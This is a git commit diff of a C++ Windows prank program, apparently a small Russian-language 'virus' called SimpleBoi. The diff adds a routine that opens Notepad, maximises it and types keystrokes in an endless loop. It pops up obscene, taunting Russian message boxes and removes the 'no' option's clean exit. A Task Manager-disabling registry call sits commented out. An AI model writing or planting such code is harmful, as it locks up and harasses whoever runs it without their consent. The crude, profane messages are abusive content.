487d14cabb1d7a69db046f0fbd71a774e3f004d2
VAX325 <48758496+VAX325@users.noreply.github.com>
2020-04-07 20:15:37 +0400

    Переписал вирус на новый лад и vs
    И убрал бинарники (сам компиль).

--- SimpleBoi/SimpleBoi/Main.cpp
+++ SimpleBoi/SimpleBoi/Main.cpp
@@ -6,6 +6,17 @@
 
 #include "Main.h"
 
+char* Sack[7] =
+{
+	"Ну охуеть теперь...",
+	"Ну перезагрузись незнаю...",
+	"Пиздец...",
+	"Ну, что хочеться ещё херню из интернета качать?",
+	"ЛОЛ ТЫ ЛОХ",
+	"В диспечер задач залезь там...",
+	"Да пошел ты... подсказывать тебе ещё"
+};
+
 void DisEnbMgr(bool v)
 {
 	RegSetKeyValue(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Polices\\System","DisbaleMgr",REG_DWORD,NULL,v);
@@ -17,41 +28,47 @@ int WINAPI WinMain(HINSTANCE hint, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int
 
 	MessageBox(NULL,"Ярик пизда компу блять!","Error!",MB_OK | MB_DEFBUTTON1 |MB_ICONWARNING);
 	if(IDOK){
-		MessageBox(NULL,"Ну шо, готов сосать?","Помянем",MB_YESNO | MB_DEFBUTTON1 |MB_ICONQUESTION);
+		MessageBox(NULL,"Ну шо, готов?","Помянем",MB_YESNO | MB_DEFBUTTON1 |MB_ICONQUESTION);
 	}
 	if(IDYES)
 	{
 		//DisEnbMgr(true);
-		Sleep(3000);
-	
-		system("start C:\\Windows\\system32\\notepad.exe");
- 
-		int k=0;
-		do{
-			if (FindWindow(NULL, "Безымянный — Блокнот")!=0 || FindWindow(NULL, "Notepad++")!=0 || FindWindow(NULL, "Microsoft PowerPoint")!=0)
-			{
-				ShowWindow(FindWindow(NULL, "Безымянный — Блокнот") , SC_MAXIMIZE);
-				LoadKeyboardLayout("00000419", KLF_ACTIVATE);
-				Sleep(1000);
-				do{
-					keybd_event('C', 0,0,0);
-					keybd_event('C', 0,KEYEVENTF_KEYUP,0);
-					keybd_event('F', 0,0,0);
-					keybd_event('F', 0,KEYEVENTF_KEYUP,0);
-					keybd_event('C', 0,0,0);
-					keybd_event('C', 0,KEYEVENTF_KEYUP,0);
-					keybd_event('B', 0,0,0);
-					keybd_event('B', 0,KEYEVENTF_KEYUP,0);
-					keybd_event(VK_SPACE, 0,0,0);
-					keybd_event(VK_SPACE, 0,KEYEVENTF_KEYUP,0);
-				}while(AppRun);
-			}
-		}while(AppRun);
+		Sleep(1000);
+		PeaceDeath(AppRun);
+		
 	}else{
-		MessageBox(NULL,"Ну ок","Ну ладно",MB_OK | MB_DEFBUTTON1 |MB_ICONWARNING);
-		DisEnbMgr(false);
-		AppRun = false;
-		return 0;
+		MessageBox(NULL,"Нет, ты сам напросился","КЕК с подливой",MB_OK | MB_DEFBUTTON1 |MB_ICONWARNING);
+		//DisEnbMgr(true);
+		//AppRun = false;
+		Sleep(1000);
+		PeaceDeath(AppRun);
+		//return 0;
 	}
 	return 0;
+}
+
+void PeaceDeath(bool AppRunned)
+{
+	Sleep(500);
+	system("start C:\\Windows\\system32\\notepad.exe");
+	int k = 0;
+	do{
+		if (FindWindow(NULL, "Безымянный — Блокнот") != 0)
+		{
+			ShowWindow(FindWindow(NULL, "Безымянный — Блокнот"), SC_MAXIMIZE);
+			LoadKeyboardLayout("00000419", KLF_ACTIVATE);
+			Sleep(1000);
+			do{
+				keybd_event('K', 0, 0, 0);
+				keybd_event('K', 0, KEYEVENTF_KEYUP, 0);
+				keybd_event('J', 0, 0, 0);
+				keybd_event('J', 0, KEYEVENTF_KEYUP, 0);
+				keybd_event('K', 0, 0, 0);
+				keybd_event('K', 0, KEYEVENTF_KEYUP, 0);
+				keybd_event(VK_SPACE, 0, 0, 0);
+				keybd_event(VK_SPACE, 0, KEYEVENTF_KEYUP, 0);
+				MessageBox(NULL, Sack[rand() % 7], "Бля Пиздец!", MB_OK | MB_DEFBUTTON1 | MB_ICONWARNING);
+			} while (AppRunned);
+		}
+	} while (AppRunned);
 }
